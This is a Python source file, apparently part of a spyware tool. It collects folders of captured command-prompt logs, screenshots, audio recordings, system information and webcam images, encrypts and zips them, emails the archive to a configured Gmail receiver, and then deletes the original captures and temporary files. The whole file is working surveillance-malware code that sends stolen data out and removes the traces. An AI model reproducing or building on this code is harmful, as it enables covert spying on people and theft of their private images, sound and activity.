import os
import time
import zipfile
import shutil
from cryptography.fernet import Fernet
from Util.DataClass import DataClass
import Util.SendMail as SendMail


class FileEncryption(DataClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        # Sender mail instance
        self.mailer = SendMail.SendMail

        # Constants
        self.zip_file_path = 'Encrypted_Folders.zip'
        self.encrypted_folders_dir = 'Encrypted_Folders'
        self.key_path = 'EncryptionKey.key'

        # Encryption key
        self.encryption_key = Fernet.generate_key()
        with open(self.key_path, 'wb') as key_file:
            key_file.write(self.encryption_key)

        # Folders in a list
        self.folders = [
            self.folder_path_cmdprompts,
            self.folder_path_screenshot,
            self.folder_path_soundfile,
            self.folder_path_systeminformation,
            self.folder_path_webcamera
        ]

        self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))

        # Load config settings - sender and receiver
        self.gmail_address_sender = self.gmail_address_sender
        self.gmail_address_receiver = self.gmail_address_receiver

    def encrypt_folder(self, folder_path):
        try:
            fernet = Fernet(self.encryption_key)
            rel_folder_path = os.path.relpath(folder_path, self.base_folder)
            encrypted_folder_path = os.path.join(self.encrypted_folders_dir, rel_folder_path)
            shutil.copytree(folder_path, encrypted_folder_path)

            for root, _, files in os.walk(encrypted_folder_path):
                for file in files:
                    if not file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            org_content = f.read()
                        encrypted_content = fernet.encrypt(org_content)
                        with open(file_path, 'wb') as f:
                            f.write(encrypted_content)

        except Exception as e:
            print(f"Error encrypting folder {folder_path}: {e}")
            return False
        return True

    def encrypt_folders(self):
        os.makedirs(self.encrypted_folders_dir, exist_ok=True)
        all_encrypted = all(self.encrypt_folder(folder) for folder in self.folders)
        if all_encrypted:
            self.create_zip()
            self.send_email()
            time.sleep(5)
            self.delete_files()
        else:
            print("Not all folders were encrypted successfully. Aborting deletion.")

    def create_zip(self):
        with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for root, _, files in os.walk(self.encrypted_folders_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))

    def send_email(self):
        self.mailer.sender_mail = self.gmail_address_sender
        self.mailer.receiver_mail = self.gmail_address_receiver
        self.mailer.send_mail(self.zip_file_path)

    def delete_files(self):
        for folder in self.folders:
            shutil.rmtree(folder)
        shutil.rmtree(self.encrypted_folders_dir)
        os.remove(self.zip_file_path)
